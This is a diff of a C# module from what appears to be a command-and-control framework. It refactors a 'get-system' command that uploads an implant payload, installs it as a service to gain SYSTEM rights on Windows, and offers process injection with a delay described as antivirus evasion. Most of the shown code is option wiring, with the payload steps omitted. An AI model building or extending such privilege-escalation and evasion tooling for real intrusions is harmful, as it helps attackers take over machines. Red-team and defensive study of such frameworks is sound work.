@@ -1,67 +1,65 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.CommandLine;
-using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using Commander.Commands.Agent;
-using Commander.Commands.Scripted;
-using Commander.Executor;
-using Common;
 using Common.Payload;
 using Shared;
-using Spectre.Console;
 
-namespace Commander.Commands.Composite
+namespace Common.Command.Custom
 {
     public class GetSystemCommandOptions
     {
+        [CommandOption("-b", "--endpoint", "EndPoint to Bind To", null)]
         public string endpoint { get; set; }
+
+        [CommandOption("-v", "--verbose", "Show details of the command execution.")]
         public bool verbose { get; set; }
+
+        [CommandOption("-n", "--pipe", "Name of the pipe used to pivot.", "localsys")]
         public string pipe { get; set; }
+
+        [CommandOption("-f", "--file", "Name of payload.", null)]
         public string file { get; set; }
+
+        [CommandOption("-p", "--path", "Name of the folder to upload the payload.", "c:\\windows")]
         public string path { get; set; }
+
+        [CommandOption("-s", "--service", "Name of service.", "syssvc")]
         public string service { get; set; }
+
+        [CommandOption("-i", "--inject", "If the payload should be an injector")]
         public bool inject { get; set; }
 
+        [CommandOption("-id", "--injectDelay", "Delay before injection (AV evasion)", 30)]
         public int injectDelay { get; set; }
 
+        [CommandOption("-ip", "--injectProcess", "Process path used for injection", null)]
         public string injectProcess { get; set; }
 
+        [CommandOption("-x86", "--x86", "Generate a x86 architecture executable")]
         public bool x86 { get; set; }
-
-
     }
-    public class GetSystemCommand : ScriptCommand<GetSystemCommandOptions>
+
+    public class GetSystemCommand : CustomCommand<GetSystemCommandOptions>
     {
-        public override string Category => CommandCategory.ToRework;
-        public override string Description => "Obtain system agent using Services";
         public override string Name => "get-system";
-        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
 
-        public override Shared.OsType[] SupportedOs => new[] { Shared.OsType.Windows };
+        public override string Description => "Obtain system agent using Services";
 
-        public override RootCommand Command => new RootCommand(this.Description)
+        public override OsType[] SupportedOs => new OsType[] { OsType.Windows };
+
+
+        protected override async Task<bool> Run(CommandExecutionContext<GetSystemCommandOptions> context)
         {
-             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
-             new Option<string>(new[] { "--endpoint", "-b" }, () => null, "EndPoint to Bind To"),
-             new Option<string>(new[] { "--pipe", "-n" }, () => "localsys","Name of the pipe used to pivot."),
-             new Option<string>(new[] { "--file", "-f" }, () => null,"Name of payload."),
-             new Option<string>(new[] { "--service", "-s" }, () => "syssvc","Name of service."),
-             new Option<string>(new[] { "--path", "-p" }, () => "c:\\windows","Name of the folder to upload the payload."),
-             //new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
-             //new Option<int>(new[] { "--injectDelay", "-id" },() => 30, "Delay before injection (AV evasion)"),
-             //new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
-             new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
-        };
+            var options = context.Options;
+            var commander = context.Commander;
+            var agent = context.Agent;
 
-        protected override void Run(ScriptingAgent<GetSystemCommandOptions> agent, ScriptingCommander<GetSystemCommandOptions> commander, ScriptingTeamServer<GetSystemCommandOptions> teamServer, GetSystemCommandOptions options, CommanderConfig config)
-        {
             if (agent.Metadata.Integrity != Shared.IntegrityLevel.High)
             {
                 commander.WriteError($"[X] Agent should be in High integrity context!");
-                return;
+                return false;
             }
 
             if (string.IsNullOrEmpty(options.endpoint))
@@ -74,7 +72,7 @@ namespace Commander.Commands.Composite
             if (!endpoint.IsValid)
             {
                 commander.WriteError($"[X] EndPoint is not valid !");
-                return;
+                return false;
             }
 
             var payloadOptions = new ImplantConfig()
@@ -146,6 +144,7 @@ namespace Commander.Commands.Composite
 
             //if (options.inject)
             //    commander.WriteInfo($"Due to AV evasion, agent can take a couple of minutes to check-in...");
+            return true;
         }
     }
 }
